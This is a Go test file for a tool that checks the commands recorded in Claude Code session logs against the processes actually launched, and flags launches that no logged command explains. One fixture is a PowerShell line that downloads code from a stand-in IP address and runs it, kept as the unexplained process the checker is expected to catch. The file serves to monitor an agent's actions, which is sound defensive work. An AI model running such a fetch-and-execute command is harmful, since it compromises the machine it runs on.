package saiddid

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

var t0 = time.Date(2026, 10, 17, 22, 0, 0, 0, time.UTC)

// Lines as Claude Code 2.1 writes them (trimmed to the fields used).
const logText = `{"type":"user","timestamp":"2026-10-17T22:00:00.000Z","sessionId":"s1","message":{"role":"user","content":"fix the build"}}
{"type":"assistant","timestamp":"2026-10-17T22:00:05.000Z","sessionId":"s1","message":{"role":"assistant","content":[{"type":"text","text":"Running tests."},{"type":"tool_use","id":"toolu_1","name":"Bash","input":{"command":"go test ./... 2>&1 | tail -5","description":"Run tests"}}]}}
{"type":"assistant","timestamp":"2026-10-17T22:01:00.000Z","sessionId":"s1","message":{"role":"assistant","content":[{"type":"tool_use","id":"toolu_2","name":"Read","input":{"file_path":"C:\\x\\a.go"}}]}}
{"type":"assistant","timestamp":"2026-10-17T22:02:00.000Z","sessionId":"s1","message":{"role":"assistant","content":[{"type":"tool_use","id":"toolu_3","name":"Bash","input":{"command":"echo \"it's done\" && git status"}}]}}
not json
`

func writeLog(t *testing.T, text string) string {
	dir := filepath.Join(t.TempDir(), "projects", "C--src-app")
	os.MkdirAll(dir, 0o700)
	p := filepath.Join(dir, "s1.jsonl")
	os.WriteFile(p, []byte(text), 0o600)
	return p
}

func TestReadLog(t *testing.T) {
	p := writeLog(t, logText)
	s, err := ReadLog(p, time.Time{})
	if err != nil || s.ID != "s1" || len(s.Said) != 2 || s.Lines != 5 {
		t.Fatalf("%+v %v", s, err)
	}
	if s.Said[0].Command != "go test ./... 2>&1 | tail -5" || !s.First.Equal(t0) || !s.Last.Equal(t0.Add(2*time.Minute)) {
		t.Fatalf("%+v", s)
	}
	if got := Logs(filepath.Dir(filepath.Dir(p)), t0.Add(-time.Hour*24*365)); len(got) != 1 {
		t.Fatalf("logs %v", got)
	}
}

func TestCompare(t *testing.T) {
	s, _ := ReadLog(writeLog(t, logText), time.Time{})
	bash := `C:\Program Files\Git\bin\bash.exe`
	seen := []Seen{
		// Claude Code's own environment capture: ignored.
		{Time: t0.Add(time.Second), PID: 1, Image: bash, CmdLine: `bash -c -l "source C:\Users\u\.claude\shell-snapshots\snapshot-bash-1.sh"`},
		// The test run, wrapped as Claude Code wraps commands on Windows.
		{Time: t0.Add(6 * time.Second), PID: 2, Image: bash, CmdLine: `"C:\Program Files\Git\bin\bash.exe" -c -l "eval 'go test ./... 2>&1 | tail -5' \< /dev/null && pwd -P"`},
		// The echo, with the single quote re-quoted.
		{Time: t0.Add(2*time.Minute + 3*time.Second), PID: 3, Image: bash, CmdLine: `bash -c -l "eval 'echo \"it'\''s done\" && git status'"`},
		// Nothing in the log asked for this.
		{Time: t0.Add(3 * time.Minute), PID: 4, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CmdLine: `powershell -c "iwr http://203.0.113.9/x | iex"`},
		// Outside any session: not counted.
		{Time: t0.Add(5 * time.Hour), PID: 5, Image: bash, CmdLine: "bash -c ls"},
	}
	r := Compare([]Session{s}, seen)
	if r.Status != "ok" || r.Said != 2 || r.Seen != 3 || r.Matched != 2 || len(r.Unexplained) != 1 || r.Unexplained[0].PID != 4 {
		t.Fatalf("%+v", r)
	}
}

func TestEachCommandExplainsOneShell(t *testing.T) {
	s, _ := ReadLog(writeLog(t, logText), time.Time{})
	sh := Seen{Time: t0.Add(6 * time.Second), Image: "bash.exe", CmdLine: `bash -c "go test ./... 2>&1 | tail -5"`}
	r := Compare([]Session{s}, []Seen{sh, sh})
	if r.Matched != 1 || len(r.Unexplained) != 1 {
		t.Fatalf("%+v", r)
	}
}

func TestCantCompareAndNoLogs(t *testing.T) {
	s, _ := ReadLog(writeLog(t, "{\"kind\":\"newformat\"}\n{\"kind\":\"newformat\"}\n"), time.Time{})
	if r := Compare([]Session{s}, nil); r.Status != "cant-compare" {
		t.Fatalf("%+v", r)
	}
	if r := Compare(nil, []Seen{{Time: t0}}); r.Status != "no-logs" || len(r.Unexplained) != 0 {
		t.Fatalf("%+v", r)
	}
}

func FuzzReadLog(f *testing.F) {
	f.Add(logText)
	f.Fuzz(func(t *testing.T, text string) {
		p := filepath.Join(t.TempDir(), "x.jsonl")
		os.WriteFile(p, []byte(text), 0o600)
		s, _ := ReadLog(p, time.Time{})
		Compare([]Session{s}, []Seen{{Time: t0, CmdLine: text}})
	})
}

func TestNothingMatchingMeansCantCompare(t *testing.T) {
	s, _ := ReadLog(writeLog(t, logText), time.Time{})
	var seen []Seen
	for i := 0; i < 6; i++ {
		seen = append(seen, Seen{Time: t0.Add(time.Duration(i) * time.Second), CmdLine: `bash C:\Users\u\AppData\Local\Temp\cmd-123.sh`})
	}
	if r := Compare([]Session{s}, seen); r.Status != "cant-compare" || len(r.Unexplained) != 0 {
		t.Fatalf("%+v", r)
	}
}
